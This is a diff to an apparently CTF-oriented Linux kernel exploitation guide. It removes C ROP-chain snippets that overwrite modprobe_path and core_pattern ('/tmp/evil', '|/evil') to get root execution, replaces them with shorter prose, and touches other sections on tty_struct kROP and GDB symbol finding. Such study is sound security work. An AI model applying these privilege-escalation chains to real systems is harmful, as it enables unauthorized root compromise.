@@ -500,43 +500,15 @@ The ROP chain still calls `commit_creds(prepare_kernel_cred(0))` and does `swapg
 
 ### Method 3: modprobe_path via ROP
 
-Instead of returning to userland, overwrite `modprobe_path` directly from the kernel ROP chain. No need to handle KPTI at all — the kernel writes to kernel memory and then triggers execution:
+Instead of returning to userland, overwrite `modprobe_path` directly from the kernel ROP chain using `pop rax; pop rdi; mov [rdi], rax; ret` gadgets. No KPTI handling needed — the write happens entirely in kernel context.
 
-```c
-unsigned long pop_rax_ret, pop_rdi_ret, mov_qword_rdi_rax_ret;
-unsigned long modprobe_path; // from /proc/kallsyms or debugging
-
-// In ROP chain:
-payload[off++] = pop_rax_ret;
-payload[off++] = 0x6c6976652f706d74;    // "/tmp/evil" as 8-byte integer (little-endian)
-payload[off++] = pop_rdi_ret;
-payload[off++] = modprobe_path;
-payload[off++] = mov_qword_rdi_rax_ret; // mov [rdi], rax; ret
-// Kernel continues/crashes, but modprobe_path is now "/tmp/evil"
-```
-
-After the kernel crashes or returns, execute a malformed binary to trigger `modprobe_path` execution as root. See [modprobe_path Overwrite](#modprobe_path-overwrite) for the full trigger sequence.
+See [modprobe_path Overwrite](#modprobe_path-overwrite) for the full technique, trigger sequence, and ROP payload.
 
 ### Method 4: core_pattern via ROP
 
-Similar to modprobe_path but uses `core_pattern` with pipe syntax. Overwrite it with `"|/evil"` then crash a process:
+Similar to Method 3 but overwrites `core_pattern` with a pipe command (e.g., `"|/evil"`). When any process crashes, the kernel executes the piped program as root.
 
-```c
-unsigned long pop_rax_ret, pop_rsi_pop1_ret, mov_qword_rsi_rax_pop1_ret;
-unsigned long core_pattern; // find via GDB (see Finding Symbol Offsets)
-
-// In ROP chain:
-payload[off++] = pop_rax_ret;
-payload[off++] = 0x6c6976652f7c;        // "|/evil\0\0" (pipe + path)
-payload[off++] = pop_rsi_pop1_ret;
-payload[off++] = core_pattern;
-payload[off++] = 0x0;                    // pop padding
-payload[off++] = mov_qword_rsi_rax_pop1_ret;
-payload[off++] = 0x0;                    // pop padding
-// Kernel crashes → coredump runs "|/evil" as root
-```
-
-**Key insight:** The `|` prefix in `core_pattern` tells the kernel to pipe the core dump to the specified program instead of writing a file. The program runs as root regardless of the crashing process's privileges.
+See [core_pattern Overwrite](#core_pattern-overwrite) for the full technique and how to find the `core_pattern` address.
 
 ---
 
@@ -629,7 +601,7 @@ Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or th
 3. After `override_creds` returns, disassemble — look for `movzx` loading from a data address
 4. That address is `core_pattern`
 
-```
+```text
 (gdb) finish
 (gdb) x/5i $rip
 => 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
@@ -645,7 +617,7 @@ Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or th
 
 With sequential write over `tty_struct` (at least 0x200 bytes), build a two-phase kROP chain entirely within the structure:
 
-```
+```text
 tty_struct layout for kROP:
   +0x00: magic, kref   → 0x5401 (preserve paranoia check)
   +0x08: dev            → addr of `pop rsp` gadget (return addr after `leave`)
@@ -775,7 +747,7 @@ if (freepointer_area > sizeof(void *)) {
 
 When enabled, free pointers are XOR-obfuscated with a per-cache random value:
 
-```
+```text
 stored_ptr = real_ptr ^ kmem_cache->random
 ```
 
@@ -787,7 +759,7 @@ stored_ptr = real_ptr ^ kmem_cache->random
 
 When KASLR is disabled (or layout is known) and the kernel uses `initramfs`:
 
-```asm
+```nasm
 jmp &flag   ; jump to the address of the flag file content in memory
 ```
 
